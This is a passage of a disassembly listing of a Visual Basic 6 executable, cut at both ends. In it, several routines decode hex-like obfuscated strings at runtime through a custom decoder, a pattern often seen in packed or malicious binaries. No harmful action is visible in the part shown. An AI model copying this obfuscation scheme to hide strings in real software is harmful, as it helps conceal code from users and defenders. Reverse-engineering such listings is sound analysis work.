.text:0040B961                 mov     [ebp+var_90], offset dword_40E0AC
.text:0040B96B                 jmp     short loc_40B977
.text:0040B96D ; ---------------------------------------------------------------------------
.text:0040B96D
.text:0040B96D loc_40B96D:                             ; CODE XREF: sub_40B485+4CB↑j
.text:0040B96D                 mov     [ebp+var_90], offset dword_40E0AC
.text:0040B977
.text:0040B977 loc_40B977:                             ; CODE XREF: sub_40B485+4E6↑j
.text:0040B977                 mov     eax, [ebp+var_90]
.text:0040B97D                 mov     eax, [eax]
.text:0040B97F                 mov     [ebp+var_1C], eax
.text:0040B982                 fld     ds:flt_4011C4
.text:0040B988                 fstp    [ebp+var_18]
.text:0040B98B                 lea     eax, [ebp+var_14]
.text:0040B98E                 push    eax
.text:0040B98F                 push    0
.text:0040B991                 lea     eax, [ebp+var_18]
.text:0040B994                 push    eax
.text:0040B995                 push    offset aQc7c5d4d7d1d5c ; "qc7c5d4d7d1d5c7b4c8d1c7dccbb5"
.text:0040B99A                 mov     eax, [ebp+var_1C]
.text:0040B99D                 mov     eax, [eax]
.text:0040B99F                 push    [ebp+var_1C]
.text:0040B9A2                 call    dword ptr [eax+24h]
.text:0040B9A5                 fnclex
.text:0040B9A7                 mov     [ebp+var_20], eax
.text:0040B9AA                 cmp     [ebp+var_20], 0
.text:0040B9AE                 jge     short loc_40B9CA
.text:0040B9B0                 push    24h ; '$'
.text:0040B9B2                 push    offset dword_4027CC
.text:0040B9B7                 push    [ebp+var_1C]
.text:0040B9BA                 push    [ebp+var_20]
.text:0040B9BD                 call    __vbaHresultCheckObj
.text:0040B9C2                 mov     [ebp+var_94], eax
.text:0040B9C8                 jmp     short loc_40B9D1
.text:0040B9CA ; ---------------------------------------------------------------------------
.text:0040B9CA
.text:0040B9CA loc_40B9CA:                             ; CODE XREF: sub_40B485+529↑j
.text:0040B9CA                 and     [ebp+var_94], 0
.text:0040B9D1
.text:0040B9D1 loc_40B9D1:                             ; CODE XREF: sub_40B485+543↑j
.text:0040B9D1                 mov     eax, [ebp+var_14]
.text:0040B9D4                 mov     [ebp+var_48], eax
.text:0040B9D7                 and     [ebp+var_14], 0
.text:0040B9DB                 mov     edx, [ebp+var_48]
.text:0040B9DE                 mov     ecx, offset dword_40E14C
.text:0040B9E3                 call    __vbaStrMove
.text:0040B9E8                 cmp     dword_40E0AC, 0
.text:0040B9EF                 jnz     short loc_40BA0C
.text:0040B9F1                 push    offset dword_40E0AC
.text:0040B9F6                 push    offset dword_401960
.text:0040B9FB                 call    __vbaNew2
.text:0040BA00                 mov     [ebp+var_98], offset dword_40E0AC
.text:0040BA0A                 jmp     short loc_40BA16
.text:0040BA0C ; ---------------------------------------------------------------------------
.text:0040BA0C
.text:0040BA0C loc_40BA0C:                             ; CODE XREF: sub_40B485+56A↑j
.text:0040BA0C                 mov     [ebp+var_98], offset dword_40E0AC
.text:0040BA16
.text:0040BA16 loc_40BA16:                             ; CODE XREF: sub_40B485+585↑j
.text:0040BA16                 mov     eax, [ebp+var_98]
.text:0040BA1C                 mov     eax, [eax]
.text:0040BA1E                 mov     [ebp+var_1C], eax
.text:0040BA21                 fld     ds:flt_4012D0
.text:0040BA27                 fstp    [ebp+var_18]
.text:0040BA2A                 lea     eax, [ebp+var_14]
.text:0040BA2D                 push    eax
.text:0040BA2E                 push    0
.text:0040BA30                 lea     eax, [ebp+var_18]
.text:0040BA33                 push    eax
.text:0040BA34                 push    offset aG38397a767f784 ; "g38397a767f7849"
.text:0040BA39                 mov     eax, [ebp+var_1C]
.text:0040BA3C                 mov     eax, [eax]
.text:0040BA3E                 push    [ebp+var_1C]
.text:0040BA41                 call    dword ptr [eax+24h]
.text:0040BA44                 fnclex
.text:0040BA46                 mov     [ebp+var_20], eax
.text:0040BA49                 cmp     [ebp+var_20], 0
.text:0040BA4D                 jge     short loc_40BA69
.text:0040BA4F                 push    24h ; '$'
.text:0040BA51                 push    offset dword_4027CC
.text:0040BA56                 push    [ebp+var_1C]
.text:0040BA59                 push    [ebp+var_20]
.text:0040BA5C                 call    __vbaHresultCheckObj
.text:0040BA61                 mov     [ebp+var_9C], eax
.text:0040BA67                 jmp     short loc_40BA70
.text:0040BA69 ; ---------------------------------------------------------------------------
.text:0040BA69
.text:0040BA69 loc_40BA69:                             ; CODE XREF: sub_40B485+5C8↑j
.text:0040BA69                 and     [ebp+var_9C], 0
.text:0040BA70
.text:0040BA70 loc_40BA70:                             ; CODE XREF: sub_40B485+5E2↑j
.text:0040BA70                 mov     eax, [ebp+var_14]
.text:0040BA73                 mov     [ebp+var_4C], eax
.text:0040BA76                 and     [ebp+var_14], 0
.text:0040BA7A                 mov     edx, [ebp+var_4C]
.text:0040BA7D                 mov     ecx, offset dword_40E154
.text:0040BA82                 call    __vbaStrMove
.text:0040BA87                 call    sub_40BAAD
.text:0040BA8C                 wait
.text:0040BA8D                 push    offset loc_40BA9E
.text:0040BA92                 jmp     short loc_40BA9D
.text:0040BA94 ; ---------------------------------------------------------------------------
.text:0040BA94
.text:0040BA94 loc_40BA94:                             ; DATA XREF: .text:004012EC↑o
.text:0040BA94                 lea     ecx, [ebp+var_14]
.text:0040BA97                 call    __vbaFreeStr
.text:0040BA9C                 retn
.text:0040BA9D ; ---------------------------------------------------------------------------
.text:0040BA9D
.text:0040BA9D loc_40BA9D:                             ; CODE XREF: sub_40B485+60D↑j
.text:0040BA9D                 retn
.text:0040BA9E ; ---------------------------------------------------------------------------
.text:0040BA9E
.text:0040BA9E loc_40BA9E:                             ; CODE XREF: sub_40B485:loc_40BA9D↑j
.text:0040BA9E                                         ; DATA XREF: sub_40B485+608↑o
.text:0040BA9E                 mov     ecx, [ebp+var_10]
.text:0040BAA1                 mov     large fs:0, ecx
.text:0040BAA8                 pop     edi
.text:0040BAA9                 pop     esi
.text:0040BAAA                 pop     ebx
.text:0040BAAB                 leave
.text:0040BAAC                 retn
.text:0040BAAC sub_40B485      endp ; sp-analysis failed
.text:0040BAAC
.text:0040BAAD
.text:0040BAAD ; =============== S U B R O U T I N E =======================================
.text:0040BAAD
.text:0040BAAD ; Attributes: bp-based frame
.text:0040BAAD
.text:0040BAAD sub_40BAAD      proc near               ; CODE XREF: sub_40B485+602↑p
.text:0040BAAD
.text:0040BAAD var_60          = dword ptr -60h
.text:0040BAAD var_5C          = dword ptr -5Ch
.text:0040BAAD var_58          = dword ptr -58h
.text:0040BAAD var_54          = dword ptr -54h
.text:0040BAAD var_50          = dword ptr -50h
.text:0040BAAD var_4C          = dword ptr -4Ch
.text:0040BAAD var_48          = dword ptr -48h
.text:0040BAAD var_44          = dword ptr -44h
.text:0040BAAD var_40          = dword ptr -40h
.text:0040BAAD var_38          = dword ptr -38h
.text:0040BAAD var_34          = dword ptr -34h
.text:0040BAAD var_30          = dword ptr -30h
.text:0040BAAD var_2C          = dword ptr -2Ch
.text:0040BAAD var_28          = dword ptr -28h
.text:0040BAAD var_24          = dword ptr -24h
.text:0040BAAD var_20          = dword ptr -20h
.text:0040BAAD var_1C          = byte ptr -1Ch
.text:0040BAAD var_18          = dword ptr -18h
.text:0040BAAD var_14          = dword ptr -14h
.text:0040BAAD var_10          = dword ptr -10h
.text:0040BAAD var_8           = dword ptr -8
.text:0040BAAD var_4           = dword ptr -4
.text:0040BAAD
.text:0040BAAD                 push    ebp
.text:0040BAAE                 mov     ebp, esp
.text:0040BAB0                 push    ecx
.text:0040BAB1                 push    ecx
.text:0040BAB2                 push    offset __vbaExceptHandler
.text:0040BAB7                 mov     eax, large fs:0
.text:0040BABD                 push    eax
.text:0040BABE                 mov     large fs:0, esp
.text:0040BAC5                 push    50h ; 'P'
.text:0040BAC7                 pop     eax
.text:0040BAC8                 call    __vbaChkstk
.text:0040BACD                 push    ebx
.text:0040BACE                 push    esi
.text:0040BACF                 push    edi
.text:0040BAD0                 mov     [ebp+var_8], esp
.text:0040BAD3                 mov     [ebp+var_4], offset dword_4012F8
.text:0040BADA                 cmp     dword_40E0AC, 0
.text:0040BAE1                 jnz     short loc_40BAFB
.text:0040BAE3                 push    offset dword_40E0AC
.text:0040BAE8                 push    offset dword_401960
.text:0040BAED                 call    __vbaNew2
.text:0040BAF2                 mov     [ebp+var_44], offset dword_40E0AC
.text:0040BAF9                 jmp     short loc_40BB02
.text:0040BAFB ; ---------------------------------------------------------------------------
.text:0040BAFB
.text:0040BAFB loc_40BAFB:                             ; CODE XREF: sub_40BAAD+34↑j
.text:0040BAFB                 mov     [ebp+var_44], offset dword_40E0AC
.text:0040BB02
.text:0040BB02 loc_40BB02:                             ; CODE XREF: sub_40BAAD+4C↑j
.text:0040BB02                 mov     eax, [ebp+var_44]
.text:0040BB05                 mov     eax, [eax]
.text:0040BB07                 mov     [ebp+var_2C], eax
.text:0040BB0A                 fld     ds:flt_4012F4
.text:0040BB10                 fstp    [ebp+var_20]
.text:0040BB13                 lea     eax, [ebp+var_14]
.text:0040BB16                 push    eax
.text:0040BB17                 push    0
.text:0040BB19                 lea     eax, [ebp+var_20]
.text:0040BB1C                 push    eax
.text:0040BB1D                 push    offset aOc2d5c28bc2c2c ; "oc2d5c28bc2c2cdd6c8d0"
.text:0040BB22                 mov     eax, [ebp+var_2C]
.text:0040BB25                 mov     eax, [eax]
.text:0040BB27                 push    [ebp+var_2C]
.text:0040BB2A                 call    dword ptr [eax+24h]
.text:0040BB2D                 fnclex
.text:0040BB2F                 mov     [ebp+var_30], eax
.text:0040BB32                 cmp     [ebp+var_30], 0
.text:0040BB36                 jge     short loc_40BB4F
.text:0040BB38                 push    24h ; '$'
.text:0040BB3A                 push    offset dword_4027CC
.text:0040BB3F                 push    [ebp+var_2C]
.text:0040BB42                 push    [ebp+var_30]
.text:0040BB45                 call    __vbaHresultCheckObj
.text:0040BB4A                 mov     [ebp+var_48], eax
.text:0040BB4D                 jmp     short loc_40BB53
.text:0040BB4F ; ---------------------------------------------------------------------------
.text:0040BB4F
.text:0040BB4F loc_40BB4F:                             ; CODE XREF: sub_40BAAD+89↑j
.text:0040BB4F                 and     [ebp+var_48], 0
.text:0040BB53
.text:0040BB53 loc_40BB53:                             ; CODE XREF: sub_40BAAD+A0↑j
.text:0040BB53                 mov     eax, [ebp+var_14]
.text:0040BB56                 mov     [ebp+var_40], eax
.text:0040BB59                 and     [ebp+var_14], 0
.text:0040BB5D                 mov     edx, [ebp+var_40]
.text:0040BB60                 mov     ecx, offset dword_40E124
.text:0040BB65                 call    __vbaStrMove
.text:0040BB6A                 cmp     dword_40E0AC, 0
.text:0040BB71                 jnz     short loc_40BB8B
.text:0040BB73                 push    offset dword_40E0AC
.text:0040BB78                 push    offset dword_401960
.text:0040BB7D                 call    __vbaNew2
.text:0040BB82                 mov     [ebp+var_4C], offset dword_40E0AC
.text:0040BB89                 jmp     short loc_40BB92
.text:0040BB8B ; ---------------------------------------------------------------------------
.text:0040BB8B
.text:0040BB8B loc_40BB8B:                             ; CODE XREF: sub_40BAAD+C4↑j
.text:0040BB8B                 mov     [ebp+var_4C], offset dword_40E0AC
.text:0040BB92
.text:0040BB92 loc_40BB92:                             ; CODE XREF: sub_40BAAD+DC↑j
.text:0040BB92                 mov     eax, [ebp+var_4C]
.text:0040BB95                 mov     eax, [eax]
.text:0040BB97                 mov     [ebp+var_2C], eax
.text:0040BB9A                 fld     ds:flt_4011DC
.text:0040BBA0                 fstp    [ebp+var_20]
.text:0040BBA3                 lea     eax, [ebp+var_14]
.text:0040BBA6                 push    eax
.text:0040BBA7                 push    0
.text:0040BBA9                 lea     eax, [ebp+var_20]
.text:0040BBAC                 push    eax
.text:0040BBAD                 push    offset aZd1c8c3cdc8d6 ; "Zd1c8c3cdc8d6"
.text:0040BBB2                 mov     eax, [ebp+var_2C]
.text:0040BBB5                 mov     eax, [eax]
.text:0040BBB7                 push    [ebp+var_2C]
.text:0040BBBA                 call    dword ptr [eax+24h]
.text:0040BBBD                 fnclex
.text:0040BBBF                 mov     [ebp+var_30], eax
.text:0040BBC2                 cmp     [ebp+var_30], 0
.text:0040BBC6                 jge     short loc_40BBDF
.text:0040BBC8                 push    24h ; '$'
.text:0040BBCA                 push    offset dword_4027CC
.text:0040BBCF                 push    [ebp+var_2C]
.text:0040BBD2                 push    [ebp+var_30]
.text:0040BBD5                 call    __vbaHresultCheckObj
.text:0040BBDA                 mov     [ebp+var_50], eax
.text:0040BBDD                 jmp     short loc_40BBE3
.text:0040BBDF ; ---------------------------------------------------------------------------
.text:0040BBDF
.text:0040BBDF loc_40BBDF:                             ; CODE XREF: sub_40BAAD+119↑j
.text:0040BBDF                 and     [ebp+var_50], 0
.text:0040BBE3
.text:0040BBE3 loc_40BBE3:                             ; CODE XREF: sub_40BAAD+130↑j
.text:0040BBE3                 and     [ebp+var_24], 0
.text:0040BBE7                 cmp     dword_40E0AC, 0
.text:0040BBEE                 jnz     short loc_40BC08
.text:0040BBF0                 push    offset dword_40E0AC
.text:0040BBF5                 push    offset dword_401960
.text:0040BBFA                 call    __vbaNew2
.text:0040BBFF                 mov     [ebp+var_54], offset dword_40E0AC
.text:0040BC06                 jmp     short loc_40BC0F
.text:0040BC08 ; ---------------------------------------------------------------------------
.text:0040BC08
.text:0040BC08 loc_40BC08:                             ; CODE XREF: sub_40BAAD+141↑j
.text:0040BC08                 mov     [ebp+var_54], offset dword_40E0AC
.text:0040BC0F
.text:0040BC0F loc_40BC0F:                             ; CODE XREF: sub_40BAAD+159↑j
.text:0040BC0F                 mov     eax, [ebp+var_54]
.text:0040BC12                 mov     eax, [eax]
.text:0040BC14                 mov     [ebp+var_34], eax
.text:0040BC17                 fld     ds:flt_4011DC
.text:0040BC1D                 fstp    [ebp+var_28]
.text:0040BC20                 lea     eax, [ebp+var_18]
.text:0040BC23                 push    eax
.text:0040BC24                 push    0
.text:0040BC26                 lea     eax, [ebp+var_28]
.text:0040BC29                 push    eax
.text:0040BC2A                 push    offset aRc4c4cfd8cab2 ; "rc4c4cfd8cab2"
.text:0040BC2F                 mov     eax, [ebp+var_34]
.text:0040BC32                 mov     eax, [eax]
.text:0040BC34                 push    [ebp+var_34]
.text:0040BC37                 call    dword ptr [eax+24h]
.text:0040BC3A                 fnclex
.text:0040BC3C                 mov     [ebp+var_38], eax
.text:0040BC3F                 cmp     [ebp+var_38], 0
.text:0040BC43                 jge     short loc_40BC5C
.text:0040BC45                 push    24h ; '$'
.text:0040BC47                 push    offset dword_4027CC
.text:0040BC4C                 push    [ebp+var_34]
.text:0040BC4F                 push    [ebp+var_38]
.text:0040BC52                 call    __vbaHresultCheckObj
.text:0040BC57                 mov     [ebp+var_58], eax
.text:0040BC5A                 jmp     short loc_40BC60
.text:0040BC5C ; ---------------------------------------------------------------------------
.text:0040BC5C
.text:0040BC5C loc_40BC5C:                             ; CODE XREF: sub_40BAAD+196↑j
.text:0040BC5C                 and     [ebp+var_58], 0
.text:0040BC60
.text:0040BC60 loc_40BC60:                             ; CODE XREF: sub_40BAAD+1AD↑j
.text:0040BC60                 lea     eax, [ebp+var_24]
.text:0040BC63                 push    eax
.text:0040BC64                 push    [ebp+var_14]
.text:0040BC67                 call    sub_40BD75
.text:0040BC6C                 mov     edx, eax
.text:0040BC6E                 lea     ecx, [ebp+var_1C]
.text:0040BC71                 call    __vbaStrMove
.text:0040BC76                 push    eax
.text:0040BC77                 push    [ebp+var_18]
.text:0040BC7A                 call    __vbaStrCat
.text:0040BC7F                 mov     edx, eax
.text:0040BC81                 mov     ecx, offset dword_40E11C
.text:0040BC86                 call    __vbaStrMove
.text:0040BC8B                 lea     eax, [ebp+var_18]
.text:0040BC8E                 push    eax
.text:0040BC8F                 lea     eax, [ebp+var_1C]
.text:0040BC92                 push    eax
.text:0040BC93                 lea     eax, [ebp+var_14]
.text:0040BC96                 push    eax
.text:0040BC97                 push    3
.text:0040BC99                 call    __vbaFreeStrList
.text:0040BC9E                 add     esp, 10h
.text:0040BCA1                 cmp     dword_40E0AC, 0
.text:0040BCA8                 jnz     short loc_40BCC2
.text:0040BCAA                 push    offset dword_40E0AC
.text:0040BCAF                 push    offset dword_401960
.text:0040BCB4                 call    __vbaNew2
.text:0040BCB9                 mov     [ebp+var_5C], offset dword_40E0AC
.text:0040BCC0                 jmp     short loc_40BCC9
.text:0040BCC2 ; ---------------------------------------------------------------------------
.text:0040BCC2
.text:0040BCC2 loc_40BCC2:                             ; CODE XREF: sub_40BAAD+1FB↑j
.text:0040BCC2                 mov     [ebp+var_5C], offset dword_40E0AC
.text:0040BCC9
.text:0040BCC9 loc_40BCC9:                             ; CODE XREF: sub_40BAAD+213↑j
.text:0040BCC9                 mov     eax, [ebp+var_5C]
.text:0040BCCC                 mov     eax, [eax]
.text:0040BCCE                 mov     [ebp+var_2C], eax
.text:0040BCD1                 fld     ds:flt_4012F0
.text:0040BCD7                 fstp    [ebp+var_20]
.text:0040BCDA                 lea     eax, [ebp+var_14]
.text:0040BCDD                 push    eax
.text:0040BCDE                 push    0
.text:0040BCE0                 lea     eax, [ebp+var_20]
.text:0040BCE3                 push    eax
.text:0040BCE4                 push    offset a8d847f898492 ; "~8d847f898492"
.text:0040BCE9                 mov     eax, [ebp+var_2C]
.text:0040BCEC                 mov     eax, [eax]
.text:0040BCEE                 push    [ebp+var_2C]
.text:0040BCF1                 call    dword ptr [eax+24h]
.text:0040BCF4                 fnclex
.text:0040BCF6                 mov     [ebp+var_30], eax
.text:0040BCF9                 cmp     [ebp+var_30], 0
.text:0040BCFD                 jge     short loc_40BD16
.text:0040BCFF                 push    24h ; '$'
.text:0040BD01                 push    offset dword_4027CC
.text:0040BD06                 push    [ebp+var_2C]
.text:0040BD09                 push    [ebp+var_30]
.text:0040BD0C                 call    __vbaHresultCheckObj
.text:0040BD11                 mov     [ebp+var_60], eax
.text:0040BD14                 jmp     short loc_40BD1A
.text:0040BD16 ; ---------------------------------------------------------------------------
.text:0040BD16
.text:0040BD16 loc_40BD16:                             ; CODE XREF: sub_40BAAD+250↑j
.text:0040BD16                 and     [ebp+var_60], 0
.text:0040BD1A
.text:0040BD1A loc_40BD1A:                             ; CODE XREF: sub_40BAAD+267↑j
.text:0040BD1A                 mov     [ebp+var_24], 1
.text:0040BD21                 lea     eax, [ebp+var_24]
.text:0040BD24                 push    eax
.text:0040BD25                 push    [ebp+var_14]
.text:0040BD28                 call    sub_40BD75
.text:0040BD2D                 mov     edx, eax
.text:0040BD2F                 mov     ecx, offset unk_40E13C
.text:0040BD34                 call    __vbaStrMove
.text:0040BD39                 lea     ecx, [ebp+var_14]
.text:0040BD3C                 call    __vbaFreeStr
.text:0040BD41                 wait
.text:0040BD42                 push    offset loc_40BD61
.text:0040BD47                 jmp     short loc_40BD60
.text:0040BD49 ; ---------------------------------------------------------------------------
.text:0040BD49
.text:0040BD49 loc_40BD49:                             ; DATA XREF: .text:00401304↑o
.text:0040BD49                 lea     eax, [ebp+var_1C]
.text:0040BD4C                 push    eax
.text:0040BD4D                 lea     eax, [ebp+var_18]
.text:0040BD50                 push    eax
.text:0040BD51                 lea     eax, [ebp+var_14]
.text:0040BD54                 push    eax
.text:0040BD55                 push    3
.text:0040BD57                 call    __vbaFreeStrList
.text:0040BD5C                 add     esp, 10h
.text:0040BD5F                 retn
.text:0040BD60 ; ---------------------------------------------------------------------------
.text:0040BD60
.text:0040BD60 loc_40BD60:                             ; CODE XREF: sub_40BAAD+29A↑j
.text:0040BD60                 retn
.text:0040BD61 ; ---------------------------------------------------------------------------
.text:0040BD61
.text:0040BD61 loc_40BD61:                             ; CODE XREF: sub_40BAAD:loc_40BD60↑j
.text:0040BD61                                         ; DATA XREF: sub_40BAAD+295↑o
.text:0040BD61                 mov     ecx, [ebp+var_10]
.text:0040BD64                 mov     large fs:0, ecx
.text:0040BD6B                 pop     edi
.text:0040BD6C                 pop     esi
.text:0040BD6D                 pop     ebx
.text:0040BD6E                 leave
.text:0040BD6F                 retn
.text:0040BD6F sub_40BAAD      endp ; sp-analysis failed
.text:0040BD6F
.text:0040BD70
.text:0040BD70 ; =============== S U B R O U T I N E =======================================
.text:0040BD70
.text:0040BD70 ; Attributes: bp-based frame
.text:0040BD70
.text:0040BD70 sub_40BD70      proc near               ; CODE XREF: sub_40D3DE+5A↓p
.text:0040BD70                 push    ebp
.text:0040BD71                 mov     ebp, esp
.text:0040BD73                 pop     ebp
.text:0040BD74                 retn
.text:0040BD74 sub_40BD70      endp
.text:0040BD74
.text:0040BD75
.text:0040BD75 ; =============== S U B R O U T I N E =======================================
.text:0040BD75
.text:0040BD75 ; Attributes: bp-based frame
.text:0040BD75
.text:0040BD75 sub_40BD75      proc near               ; CODE XREF: sub_40BAAD+1BA↑p
.text:0040BD75                                         ; sub_40BAAD+27B↑p
.text:0040BD75
.text:0040BD75 var_44          = dword ptr -44h
.text:0040BD75 var_40          = dword ptr -40h
.text:0040BD75 var_3C          = dword ptr -3Ch
.text:0040BD75 var_30          = dword ptr -30h
.text:0040BD75 var_2C          = dword ptr -2Ch
.text:0040BD75 var_28          = dword ptr -28h
.text:0040BD75 var_24          = dword ptr -24h
.text:0040BD75 var_20          = byte ptr -20h
.text:0040BD75 var_1C          = dword ptr -1Ch
.text:0040BD75 var_18          = dword ptr -18h
.text:0040BD75 var_14          = dword ptr -14h
.text:0040BD75 var_C           = dword ptr -0Ch
.text:0040BD75 var_8           = dword ptr -8
.text:0040BD75 var_4           = dword ptr -4
.text:0040BD75 arg_0           = dword ptr  8
.text:0040BD75 arg_4           = dword ptr  0Ch
.text:0040BD75
.text:0040BD75                 push    ebp
.text:0040BD76                 mov     ebp, esp
.text:0040BD78                 sub     esp, 0Ch
.text:0040BD7B                 push    offset __vbaExceptHandler
.text:0040BD80                 mov     eax, large fs:0
.text:0040BD86                 push    eax
.text:0040BD87                 mov     large fs:0, esp
.text:0040BD8E                 push    30h ; '0'
.text:0040BD90                 pop     eax
.text:0040BD91                 call    __vbaChkstk
.text:0040BD96                 push    ebx
.text:0040BD97                 push    esi
.text:0040BD98                 push    edi
.text:0040BD99                 mov     [ebp+var_C], esp
.text:0040BD9C                 mov     [ebp+var_8], offset dword_401308
.text:0040BDA3                 mov     edx, [ebp+arg_0]
.text:0040BDA6                 lea     ecx, [ebp+var_20]
.text:0040BDA9                 call    __vbaStrCopy
.text:0040BDAE                 push    0
.text:0040BDB0                 push    2
.text:0040BDB2                 push    1
.text:0040BDB4                 push    3
.text:0040BDB6                 lea     eax, [ebp+var_1C]
.text:0040BDB9                 push    eax
.text:0040BDBA                 push    4
.text:0040BDBC                 push    80h
.text:0040BDC1                 call    __vbaRedim
.text:0040BDC6                 add     esp, 1Ch
.text:0040BDC9                 cmp     dword_40E0AC, 0
.text:0040BDD0                 jnz     short loc_40BDEA
.text:0040BDD2                 push    offset dword_40E0AC
.text:0040BDD7                 push    offset dword_401960
.text:0040BDDC                 call    __vbaNew2
.text:0040BDE1                 mov     [ebp+var_40], offset dword_40E0AC
.text:0040BDE8                 jmp     short loc_40BDF1
.text:0040BDEA ; ---------------------------------------------------------------------------
.text:0040BDEA
.text:0040BDEA loc_40BDEA:                             ; CODE XREF: sub_40BD75+5B↑j
.text:0040BDEA                 mov     [ebp+var_40], offset dword_40E0AC
.text:0040BDF1
.text:0040BDF1 loc_40BDF1:                             ; CODE XREF: sub_40BD75+73↑j
.text:0040BDF1                 mov     eax, [ebp+var_40]
.text:0040BDF4                 mov     eax, [eax]
.text:0040BDF6                 mov     [ebp+var_2C], eax
.text:0040BDF9                 push    offset sub_40D204
.text:0040BDFE                 push    offset unk_40E0F4
.text:0040BE03                 push    offset unk_40E110
.text:0040BE08                 mov     eax, [ebp+var_2C]
.text:0040BE0B                 mov     eax, [eax]
.text:0040BE0D                 push    [ebp+var_2C]
.text:0040BE10                 call    dword ptr [eax+20h]
.text:0040BE13                 fnclex
.text:0040BE15                 mov     [ebp+var_30], eax
.text:0040BE18                 cmp     [ebp+var_30], 0
.text:0040BE1C                 jge     short loc_40BE35
.text:0040BE1E                 push    20h ; ' '
.text:0040BE20                 push    offset dword_4027CC
.text:0040BE25                 push    [ebp+var_2C]
.text:0040BE28                 push    [ebp+var_30]
.text:0040BE2B                 call    __vbaHresultCheckObj
.text:0040BE30                 mov     [ebp+var_44], eax
.text:0040BE33                 jmp     short loc_40BE39
.text:0040BE35 ; ---------------------------------------------------------------------------
.text:0040BE35
.text:0040BE35 loc_40BE35:                             ; CODE XREF: sub_40BD75+A7↑j
.text:0040BE35                 and     [ebp+var_44], 0
.text:0040BE39
.text:0040BE39 loc_40BE39:                             ; CODE XREF: sub_40BD75+BE↑j
.text:0040BE39                 mov     eax, [ebp+var_1C]
.text:0040BE3C                 xor     ecx, ecx
.text:0040BE3E                 sub     ecx, [eax+14h]
.text:0040BE41                 mov     eax, [ebp+var_1C]
.text:0040BE44                 mov     eax, [eax+0Ch]
.text:0040BE47                 mov     dword ptr [eax+ecx*4], 8
.text:0040BE4E                 lea     eax, [ebp+var_20]
.text:0040BE51                 push    eax
.text:0040BE52                 call    sub_40A464
.text:0040BE57                 mov     ecx, [ebp+var_1C]
.text:0040BE5A                 push    2
.text:0040BE5C                 pop     edx
.text:0040BE5D                 sub     edx, [ecx+14h]
.text:0040BE60                 mov     ecx, [ebp+var_1C]
.text:0040BE63                 mov     ecx, [ecx+0Ch]
.text:0040BE66                 mov     [ecx+edx*4], eax
.text:0040BE69                 mov     eax, [ebp+arg_4]
.text:0040BE6C                 cmp     dword ptr [eax], 0
.text:0040BE6F                 jnz     short loc_40BEC9
.text:0040BE71                 push    [ebp+var_1C]
.text:0040BE74                 lea     eax, [ebp+var_24]
.text:0040BE77                 push    eax
.text:0040BE78                 call    __vbaAryLock
.text:0040BE7D                 mov     eax, [ebp+var_24]
.text:0040BE80                 xor     ecx, ecx
.text:0040BE82                 sub     ecx, [eax+14h]
.text:0040BE85                 mov     eax, [ebp+var_24]
.text:0040BE88                 mov     eax, [eax+0Ch]
.text:0040BE8B                 lea     eax, [eax+ecx*4]
.text:0040BE8E                 push    eax
.text:0040BE8F                 call    sub_40D204
.text:0040BE94                 mov     edx, eax
.text:0040BE96                 lea     ecx, [ebp+var_28]
.text:0040BE99                 call    __vbaStrMove
.text:0040BE9E                 lea     eax, [ebp+var_24]
.text:0040BEA1                 push    eax
.text:0040BEA2                 call    __vbaAryUnlock
.text:0040BEA7                 push    [ebp+var_28]
.text:0040BEAA                 push    dword_40E0D0
.text:0040BEB0                 call    __vbaStrCat
.text:0040BEB5                 mov     edx, eax
.text:0040BEB7                 lea     ecx, [ebp+var_18]
.text:0040BEBA                 call    __vbaStrMove
.text:0040BEBF                 lea     ecx, [ebp+var_28]
.text:0040BEC2                 call    __vbaFreeStr
.text:0040BEC7                 jmp     short loc_40BF14
.text:0040BEC9 ; ---------------------------------------------------------------------------
.text:0040BEC9
.text:0040BEC9 loc_40BEC9:                             ; CODE XREF: sub_40BD75+FA↑j
.text:0040BEC9                 push    [ebp+var_1C]
.text:0040BECC                 lea     eax, [ebp+var_24]
.text:0040BECF                 push    eax
.text:0040BED0                 call    __vbaAryLock
.text:0040BED5                 mov     eax, [ebp+var_24]
.text:0040BED8                 xor     ecx, ecx
.text:0040BEDA                 sub     ecx, [eax+14h]
.text:0040BEDD                 mov     eax, [ebp+var_24]
.text:0040BEE0                 mov     eax, [eax+0Ch]
.text:0040BEE3                 lea     eax, [eax+ecx*4]
.text:0040BEE6                 push    eax
.text:0040BEE7                 call    sub_40D204
.text:0040BEEC                 mov     edx, eax
.text:0040BEEE                 lea     ecx, [ebp+var_28]
.text:0040BEF1                 call    __vbaStrMove
.text:0040BEF6                 lea     eax, [ebp+var_24]
.text:0040BEF9                 push    eax
.text:0040BEFA                 call    __vbaAryUnlock
.text:0040BEFF                 mov     eax, [ebp+var_28]
.text:0040BF02                 mov     [ebp+var_3C], eax
.text:0040BF05                 and     [ebp+var_28], 0
.text:0040BF09                 mov     edx, [ebp+var_3C]
.text:0040BF0C                 lea     ecx, [ebp+var_18]
.text:0040BF0F                 call    __vbaStrMove
.text:0040BF14
.text:0040BF14 loc_40BF14:                             ; CODE XREF: sub_40BD75+152↑j
.text:0040BF14                 push    offset loc_40BF53
.text:0040BF19                 jmp     short loc_40BF3F
.text:0040BF1B ; ---------------------------------------------------------------------------
.text:0040BF1B
.text:0040BF1B loc_40BF1B:                             ; DATA XREF: .text:00401314↑o
.text:0040BF1B                 mov     eax, [ebp+var_4]
.text:0040BF1E                 and     eax, 4
.text:0040BF21                 test    eax, eax
.text:0040BF23                 jz      short loc_40BF2D
.text:0040BF25                 lea     ecx, [ebp+var_18]
.text:0040BF28                 call    __vbaFreeStr
.text:0040BF2D
.text:0040BF2D loc_40BF2D:                             ; CODE XREF: sub_40BD75+1AE↑j
.text:0040BF2D                 lea     eax, [ebp+var_24]
.text:0040BF30                 push    eax
.text:0040BF31                 call    __vbaAryUnlock
.text:0040BF36                 lea     ecx, [ebp+var_28]
.text:0040BF39                 call    __vbaFreeStr
.text:0040BF3E                 retn
.text:0040BF3F ; ---------------------------------------------------------------------------
.text:0040BF3F
.text:0040BF3F loc_40BF3F:                             ; CODE XREF: sub_40BD75+1A4↑j
.text:0040BF3F                                         ; DATA XREF: .text:00401310↑o
.text:0040BF3F                 lea     eax, [ebp+var_1C]
.text:0040BF42                 push    eax
.text:0040BF43                 push    0
.text:0040BF45                 call    __vbaAryDestruct
.text:0040BF4A                 lea     ecx, [ebp+var_20]
.text:0040BF4D                 call    __vbaFreeStr
.text:0040BF52                 retn
.text:0040BF53 ; ---------------------------------------------------------------------------
.text:0040BF53
.text:0040BF53 loc_40BF53:                             ; DATA XREF: sub_40BD75:loc_40BF14↑o
.text:0040BF53                 mov     eax, [ebp+var_18]
.text:0040BF56                 mov     ecx, [ebp+var_14]
.text:0040BF59                 mov     large fs:0, ecx
